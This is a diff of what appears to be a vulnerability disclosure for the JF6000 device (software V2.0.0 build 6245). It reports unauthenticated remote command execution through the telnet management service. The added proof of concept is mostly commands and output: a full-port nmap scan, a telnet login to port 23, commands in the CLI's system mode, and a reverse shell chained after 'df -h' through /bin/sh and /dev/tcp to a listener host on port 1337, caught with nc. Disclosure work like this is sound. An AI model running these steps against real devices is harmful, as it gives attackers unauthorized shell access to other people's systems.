@@ -1,6 +1,9 @@
-【Affected Product Code Base】
-JF6000 - Product number JF6000 Product Serial Number 020305882208001 hardware version V1.2.0 Software version V2.0.0 build 6245 Software release date 2021-09-07
-【EXP】
+[Vulnerability Type]:  Remote command execution
+[Affected version(s)]：Shenzhen Jieshi Feitong Technology Co., Ltd. JF6000 - Product number JF6000 Product Serial Number 020305882208001 hardware version V1.2.0 Software version V2.0.0 build 6245 Software release date 2021-09-07
+[Root Cause]：The remote management telnet service does not enable the authentication function, and unauthorized access leads to command execution.
+[Impact]：Unauthorized access resulted in command execution, getshell.
+[POC]
+1、port scan telnet service
 nmap  -p1-65535 172.16.xx.xx
 Nmap scan report for 172.16.xx.xx
 Host is up (0.019s latency).
@@ -22,7 +25,8 @@ PORT     STATE SERVICE
 9000/tcp open  cslistener
 
 Command Line Interface
-
+2、Execute commands remotely
+telnet targetip 23
 cli> system
 
 cli(system)> df -h
@@ -35,6 +39,7 @@ tmpfs                3.8G     0  3.8G    0% /sys/fs/cgroup
 /dev/sda1            477M  115M  333M   26% /boot
 tmpfs                776M     0  776M    0% /run/user/0
 
+reverse shell
 cli(system)> df -h && /bin/sh -i >& /dev/tcp/172.16.xx.xx/1337 0>&1
 
 $ nc -lvnp 1337
